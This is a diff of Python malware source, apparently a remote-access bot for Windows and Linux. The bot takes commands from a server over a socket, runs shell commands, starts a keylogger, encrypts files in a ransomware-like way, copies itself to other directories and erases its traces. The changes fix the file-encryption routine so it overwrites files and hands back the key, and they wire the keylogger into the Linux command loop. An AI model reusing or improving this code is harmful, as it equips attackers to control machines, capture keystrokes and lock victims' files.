@@ -206,7 +206,7 @@ def keylogger():
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
-def crypto(action: str, request):
+def crypto(action: str, *args):
 	"""This function will handle all of our encryption/decryption processes.
 		Argument:
 			action (str): Will take value of encrypt or decrypt.
@@ -215,23 +215,29 @@ def crypto(action: str, request):
 			Confirmation string.
 	"""
 	if action == 'encrypt':
-		to_encrypt = request[0]
-		f = open(to_encrypt, 'wb+')
-		data = f.read()
-		key = Fernet.generate_key()
-		cipher = Fernet(key)
-		cipher_text = cipher.encrypt(data)
-		f.write(cipher_text)
-		f.close()
-		return f'{to_encrypt} encrypted.'
+		to_encrypt = args[0]
+		with open(to_encrypt, 'wb+') as f:
+			data = f.read()
+			key = Fernet.generate_key()
+			cipher = Fernet(key)
+			cipher_text = cipher.encrypt(data)
+			f.seek(0)
+			f.write(cipher_text)
+			f.truncate()
+			return f'  Save the decryption key -> {key.decode()}'
 	else:
-		to_encrypt, key = request
-		f = open(to_encrypt, 'wb+')
-		cipher_text = f.read()
-		cipher = Fernet(key)
-		plain_text = cipher.decrypt(cipher_text)
-		f.close()
-		return '[+] File successfully decrypted!'
+		to_encrypt, key = args[0][0], args[0][1]
+		with open(to_encrypt, 'wb+') as f:
+			cipher_text = f.read()
+			cipher = Fernet(key)
+			try:
+				plain_text = cipher.decrypt(cipher_text)
+			except cryptography.fernet.InvalidToken:
+				return '  [-] Invalid key!'
+			f.seek(0)
+			f.write(plain_text)
+			f.truncate()
+			return '  [+] File successfully decrypted!'
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -251,6 +257,7 @@ class WindowsBot:
 		"""
 		DEVNULL = open(os.devnull, 'w') # Open devnull file to send stderr to.
 		try:
+			# os.popen('cat /etc/services').read()
 			output = run(command, # Run command.
 						shell=True, # Perform this command in cmd.exe.
 						stdout=PIPE, # Pipe command to store in variable.
@@ -264,7 +271,7 @@ class WindowsBot:
 				try:
 					os.system(command) # Try executing command with OS module.
 				except:
-					return "[-] Invalid command..." # Return this error message if unsuccessful.
+					return "[-] Invalid command." # Return this error message if unsuccessful.
 
 	def handle_request(self):
 		"""This function will handle all tasks related to request made by the server.
@@ -278,13 +285,14 @@ class WindowsBot:
 			with sock: # Utilizing this socket connection in context manager.
 				while True: # Continue to receive commands.
 					command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
-					command_output = 'Invalid command'
+					command_output = '[-] Invalid command.'
 					if command.strip() == 'keylog': # Start the keylogger.
 						keylogger()
+						command_output = 'listening'
 					elif command[:7] == 'encrypt': # Encrypt file specified.
 						command_output = crypto(command[:7], command[8:])
 					elif command[:7] == 'decrypt': # Decrypt file with key.
-						command_output = crypto(command[7:], command[8:].split())
+						command_output = crypto(command[7:], command[8:].strip().split())
 					elif command.strip() == 'propagate': # Copy this file to multiple directory.
 						command_output = propagate(FILENAME)
 					elif command.strip() == 'destory': # Attempt to delete any traces of this file.
@@ -313,6 +321,7 @@ class LinuxBot:
 		"""
 		DEVNULL = open(os.devnull, 'w') # Open devnull file to send stderr to.
 		try:
+			# os.popen('cat /etc/services').read()
 			output = run(command.split(), # Run command.
 						stdout=PIPE, # Pipe command to store in variable.
 						stderr=DEVNULL)	# Send standard error to devnull.
@@ -325,7 +334,7 @@ class LinuxBot:
 				try:
 					os.system(command) # Try executing command with OS module.
 				except:
-					return "[-] Invalid command..." # Return this error message if unsuccessful.
+					return "[-] Invalid command." # Return this error message if unsuccessful.
 
 	def handle_request(self):
 		"""This function will handle all tasks related to request made by the server.
@@ -339,13 +348,14 @@ class LinuxBot:
 			with sock: # Utilizing this socket connection in context manager.
 				while True: # Continue to receive commands.
 					command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
-					command_output = 'Ivvalid command.'
+					command_output = '[-] Invalid command.'
 					if command.strip() == 'keylog': # Start the keylogger.
+						keylogger()
 						command_output = 'listening'
 					elif command[:7] == 'encrypt': # Encrypt file specified.
 						command_output = crypto(command[:7], command[8:])
 					elif command[:7] == 'decrypt': # Decrypt file with key.
-						command_output = crypto(command[7:], command[8:].split())
+						command_output = crypto(command[7:], command[8:].strip().split())
 					elif command.strip() == 'propagate': # Copy this file to multiple directory.
 						command_output = propagate(FILENAME)
 					elif command.strip() == 'destory': # Attempt to delete any traces of this file.
